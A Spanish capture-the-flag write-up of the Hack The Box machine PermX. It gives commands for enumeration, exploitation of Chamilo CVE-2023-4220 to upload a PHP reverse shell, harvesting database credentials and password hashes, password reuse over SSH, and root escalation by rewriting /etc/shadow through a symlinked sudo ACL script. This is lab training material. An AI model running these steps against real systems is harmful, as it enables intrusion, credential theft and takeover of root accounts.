
# PermX

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.23` a nuestro `/etc/hosts` y accedemos través del navegador.

<figure><img src="/files/hzUbtT3J5aPpoFBqTt9h" alt=""><figcaption></figcaption></figure>

Parece una web de cursos online. En la pestaña About, encontramos la parte del equipo, que nos podría servir para hacer bruteforce contra usuarios dirigidos:

<figure><img src="/files/YIx6l6G1j7IZbRGSVagw" alt=""><figcaption></figcaption></figure>

La mayoría de links no llevan a ningún lado y solamente recargan la página actual. En principio no encontramos nada relevante. &#x20;

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sCV -T5 10.10.11.23
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: eLEARNING
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos 2 puertos abiertos, el 22 y el 80. Los típicos. Podríamos probar a hacer bruteforce de SSH con los usuarios que encontramos en la web.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos unos pocos directorios:

```bash
dirsearch -u http://permx.htb -x 300,301,302,400,403,404,503

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/freelancer/reports/http_permx.htb/_24-08-13_00-03-19.txt

Target: http://permx.htb/

[00:03:19] Starting: 
[00:03:25] 200 -    3KB - /404.html
[00:03:26] 200 -    4KB - /about.html
[00:03:38] 200 -    3KB - /contact.html
[00:03:47] 200 -  448B  - /js/
[00:03:48] 200 -  491B  - /lib/
[00:03:48] 200 -  649B  - /LICENSE.txt
```

Revisando los directorios no encontramos nada relevante.

## <mark style="color:purple;">Enumeración de Vhosts</mark>

En este momento puede parecer que no podemos hacer nada, pero vamos a usar ffuf para enumerar subdominios dentro de este host:

```bash
ffuf -u http://permx.htb -H "Host:FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 80ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 106ms]
```

Encontramos los subdominios `www` y `lms`, por lo que vamos a añadirlos a nuestro /etc/hosts.

Nos interesa sobre todo el subdominio `lms.permx.htb`:

<figure><img src="/files/MEKFguSbCmK0zwcXQLSJ" alt=""><figcaption></figcaption></figure>

Llegamos a un panel de login de Chamilo, un software de elearning. En este punto podríamos buscar exploits específicos.

## <mark style="color:purple;">Búsqueda de exploits</mark>

Haciendo un poco de research nos encontramos este exploit en Github que nos podría servir:

{% embed url="<https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit>" %}

Si lo ejecutamos nos da las instrucciones:

```
bash CVE-2023-4220.sh                             

All options -f, -h, and -p are required.

Usage: CVE-2023-4220.sh -f reverse_file -h host_link -p port_in_the_reverse_file

Options:
  -f    Path to the reverse file
  -h    Host link where the file will be uploaded
  -p    Port for the reverse shell
```

Necesitamos especificarle:

* Una reverse shell (en php)
* El host de destino
* El puerto para nuestra reverse shell

Voy a crear una reverse shell por ejemplo con el plugin de Hack Tools:

<figure><img src="/files/hjjmdLHBLOpknR40Biaj" alt=""><figcaption></figcaption></figure>

Lo voy a guardar en el directorio raiz `/` con el nombre de `shell.php`

## <mark style="color:purple;">Explotación</mark>

Vamos a ejecutar el exploit de la siguiente manera:

```bash
bash CVE-2023-4220.sh -f /home/kali/shell.php -h http://lms.permx.htb/ -p 1234

The file has successfully been uploaded.

#    Use This leter For Interactive TTY ;)  
#    python3 -c 'import pty;pty.spawn("/bin/bash")'
#    export TERM=xterm
#    CTRL + Z
#    stty raw -echo; fg

# Starting Reverse Shell On Port 1234 . . . . . . .
```

Ahora si vamos a la siguiente ruta deberíamos ver nuestra shell:

```
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/
```

<figure><img src="/files/niFzIG2KKiJQX3m7R5ru" alt=""><figcaption></figcaption></figure>

Hay más hackers atacando la máquina, por eso que hay varias reverse shells subidas, pero hacemos click en la nuestra y recibimos la conexión en la terminal!

```shell-session
www-data@permx:/$ whoami
www-data
www-data@permx:/$ ls
bin   dev  home  lib32	libx32	   media  opt	root  sbin  sys  usr
boot  etc  lib	lib64	lost+found  mnt    proc  run   srv   tmp  var
www-data@permx:/$ cd home
www-data@permx:/home$ ls
mtz
www-data@permx:/home$ cd mtz
bash: cd: mtz: Permission denied
```

Somos el usuario `www-data`, y vemos que hay un usuario `mtz` en el sistema (user flag), pero no podemos acceder. Vamos a hacer un poco de credential hunting:

{% content-ref url="/pages/zIfv10AYKkDbbaHf34TR" %}
[Credential Hunting - Linux](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md)
{% endcontent-ref %}

Ejecutamos un Linpeas y encontramos cosas relevantes, como un posible usuario y contraseña para una base de datos MongoDB:

```
╔══════════╣ Analyzing Env Files (limit 70)
-rwxr-xr-x 1 www-data www-data 326 Nov  3  2022 /var/www/chamilo/vendor/knplabs/gaufrette/.env.dist
AWS_KEY=
AWS_SECRET=
AWS_BUCKET=
AZURE_ACCOUNT=
AZURE_KEY=
AZURE_CONTAINER=
FTP_HOST=ftp
FTP_PORT=21
FTP_USER=gaufrette
FTP_PASSWORD=gaufrette
FTP_BASE_DIR=/gaufrette
MONGO_URI=mongodb://mongodb:27017
MONGO_DBNAME=gridfs_test
SFTP_HOST=sftp
SFTP_PORT=22
SFTP_USER=gaufrette
SFTP_PASSWORD=gaufrette
SFTP_BASE_DIR=gaufrette
```

Usando técnicas de Credential Hunting buscando archivos de configuración, encontramos uno que contiene credenciales para una base de datos:

```shell-session
www-data@permx:/$ find / -type f -name "configuration.php" -exec ls -l {} \; 2>/dev/null
-rw-r--r-- 1 www-data www-data 127902 Jan 20  2024 /var/www/chamilo/app/config/configuration.php
-rwxr-xr-x 1 www-data www-data 1258 Aug 31  2023 /var/www/chamilo/plugin/sepe/src/configuration.php

www-data@permx:/$ cat /var/www/chamilo/app/config/configuration.php
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
<------SNIP------>
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

## <mark style="color:purple;">Conexión a base de datos</mark>

Vamos a usar estar credenciales para conectarnos a mysql:

```shell-session
www-data@permx:/$ mysql -h localhost -P 3306 -u chamilo -p chamilo
Enter password: 03F6lY3uXAP2bkW8

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 137
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [chamilo]>
```

### Enumeración de la BBDD

De todas las tablas de la base de datos, nos interesa la tabla user, donde podría haber información confidencial sobre el usuario:

```sql
MariaDB [chamilo]> show databases;
+--------------------+
| Database           |
+--------------------+
| chamilo            |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [chamilo]> use chamilo
Database changed
MariaDB [chamilo]> show tables;
+-------------------------------------+
| Tables_in_chamilo                   |
+-------------------------------------+
| access_url                          |
| access_url_rel_course               |
| access_url_rel_course_category      |
| access_url_rel_session              |
| access_url_rel_user                 |
| access_url_rel_usergroup            |
| admin                               |
| c_attendance                        |
| c_attendance_calendar               |
| c_attendance_calendar_rel_group     |
| c_attendance_result                 |
| c_attendance_sheet                  |
| c_attendance_sheet_log              |
| c_blog                              |
<-----------------SNIP---------------->
| user                                |
| user_api_key                        |
| version                             |
+-------------------------------------+
239 rows in set (0.001 sec)
```

```sql
MariaDB [chamilo]> SELECT * FROM user;
+----+---------+----------+--------------------+-----------------------+-----------------------+--------+---------+---------+---------------------+-----------------------+------------+-----------+-----------+--------------------------------------------------------------+-----------------+---------+---------------------------------------------+---------------------+------------+------------+--------------------+-----------------------+------------------------------------+-------------------+-------------+--------+---------------+-------------+------------+-------------+----------+----------+-------+-------------+----------+---------------------+-----------------+--------+--------+-------+------------+
| id | user_id | username | username_canonical | email_canonical       | email                 | locked | enabled | expired | credentials_expired | credentials_expire_at | expires_at | lastname  | firstname | password                                                     | phone           | address | salt                                        | last_login          | created_at | updated_at | confirmation_token | password_requested_at | roles                              | profile_completed | auth_source | status | official_code | picture_uri | creator_id | competences | diplomas | openarea | teach | productions | language | registration_date   | expiration_date | active | openid | theme | hr_dept_id |
+----+---------+----------+--------------------+-----------------------+-----------------------+--------+---------+---------+---------------------+-----------------------+------------+-----------+-----------+--------------------------------------------------------------+-----------------+---------+---------------------------------------------+---------------------+------------+------------+--------------------+-----------------------+------------------------------------+-------------------+-------------+--------+---------------+-------------+------------+-------------+----------+----------+-------+-------------+----------+---------------------+-----------------+--------+--------+-------+------------+
|  1 |       1 | admin    | admin              | admin@permx.htb       | admin@permx.htb       |      0 |       1 |       0 |                   0 | NULL                  | NULL       | Miller    | Davis     | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra | (000) 001 02 03 |         | awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4 | 2024-01-20 18:44:07 | NULL       | NULL       | NULL               | NULL                  | a:1:{i:0;s:16:"ROLE_SUPER_ADMIN";} |              NULL | platform    |      1 | ADMIN         |             |          0 | NULL        | NULL     | NULL     | NULL  | NULL        | english  | 2024-01-20 18:20:32 | NULL            |      1 | NULL   | NULL  |          0 |
|  2 |       2 | anon     | anon               | anonymous@example.com | anonymous@example.com |      0 |       1 |       0 |                   0 | NULL                  | NULL       | Anonymous | Joe       | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |                 |         | Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY | NULL                | NULL       | NULL       | NULL               | NULL                  | a:0:{}                             |              NULL | platform    |      6 | anonymous     |             |          0 | NULL        | NULL     | NULL     | NULL  | NULL        | english  | 2024-01-20 18:20:32 | NULL            |      1 | NULL   | NULL  |          0 |
+----+---------+----------+--------------------+-----------------------+-----------------------+--------+---------+---------+---------------------+-----------------------+------------+-----------+-----------+--------------------------------------------------------------+-----------------+---------+---------------------------------------------+---------------------+------------+------------+--------------------+-----------------------+------------------------------------+-------------------+-------------+--------+---------------+-------------+------------+-------------+----------+----------+-------+-------------+----------+---------------------+-----------------+--------+--------+-------+------------+
2 rows in set (0.000 sec)
```

Buuum! Obtenemos las credenciales del admin y de un nuevo usuario anonymous.

En BCrypt, el hash incluye el salt y el costo. Por ejemplo:

```
$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra
|  | |  |        |
|  | |  |        +---> Salt y Hash combinados
|  | |  +------------> Salt
|  | +---------------> Cost factor (04 en este caso)
|  +-----------------> Algoritmo (BCrypt, versión `$2y$`)
```

Vamos a guardar estos 2 hashes en un archivo `hashes.txt` y vamos a crackearlo con john:

## <mark style="color:purple;">User flag</mark>

Intentamos crackear estos hashes pero tarda demasiado. Vamos a probar a conectarnos por SSH con la contraseña de la base de datos, ya que puede estar reutilizada, y nos logueamos como el único usuario que habia en el sistema `mtz`:

```bash
ssh mtz@10.10.11.23
mtz@10.10.11.23's password: 03F6lY3uXAP2bkW8
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
```

<figure><img src="/files/kHrUUyevzHdSOzxYPOVl" alt=""><figcaption></figcaption></figure>

Tenemos la User Flag! 🏆

## <mark style="color:purple;">Escalada de privilegios</mark>

Lo primero, comprobamos como siempre los permisos de ejecución de este usuario `mtz`:

```shell-session
mtz@permx:~$ sudo -l                                                                          
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Vamos a ver el contenido del script `acl.sh`:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Este script permite modificar los permisos dentro del path `/home/mtz` , entonces lo que vamos hacer es ejecutar los siguientes dos comandos:

```bash
ln -s / root  
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
```

1. El primer comando crea un simlink, una especie de acceso directo del path `/` con un nombre llamado root.
2. El segundo comando ejecuta el script acl.sh que este otorga permisos de escritura y lectura al archivo o carpeta que sea crea con el nombre root ubicado en `/home/mtz`. Esto nos permite leer y escribir el archivo `/etc/shadow`, lo que nos permitiría cambiar la contraseña del usuario root.

### Ejecutando el script para leer /etc/shadow

```shell-session
mtz@permx:~$ ln -s / root
mtz@permx:~$ ls
root  user.txt
mtz@permx:~$ cd root
mtz@permx:~/root$ ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
mtz@permx:~/root$ cd ..
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
mtz@permx:~$ cat /home/mtz/root/etc/shadow
root:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```

### Crear nuevo password de root

```shell-session
# Password actual
root:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7:::
```

```shell-session
# Nuevo password
mtz@permx:~$ openssl passwd -6 afsh4ck
$6$DmuarOdW7jXd.2vn$Xp9KjrLbFPOC2FufelLNDj0mYD6Y8ngJwD0X2qMe0fYHmjBHAO7YrQo5Z1fbixwNhLTOwRvG9fKCkwzxJpOVd.
```

### Elevar privilegios

```shell-session
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow                                                                                                     
echo 'root:$6$DmuarOdW7jXd.2vn$Xp9KjrLbFPOC2FufelLNDj0mYD6Y8ngJwD0X2qMe0fYHmjBHAO7YrQo5Z1fbixwNhLTOwRvG9fKCkwzxJpOVd.:19742:0:99999:7:::' > /home/mtz/root/etc/shadow                                                          adow 
mtz@permx:~$ su root
Password: afsh4ck
root@permx:/home/mtz# whoami 
root
root@permx:/home/mtz# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
6867dd0d0******************
```

Como veis, hemos modificado la contraseña del usuario root con la que hemos creado mediante openssl, siguiendo la misma estructura de contraseña.

Una vez que hemos modificado la contraseña, cambiamos al usuario root con `su root` y listo. Ya somos root! 😎
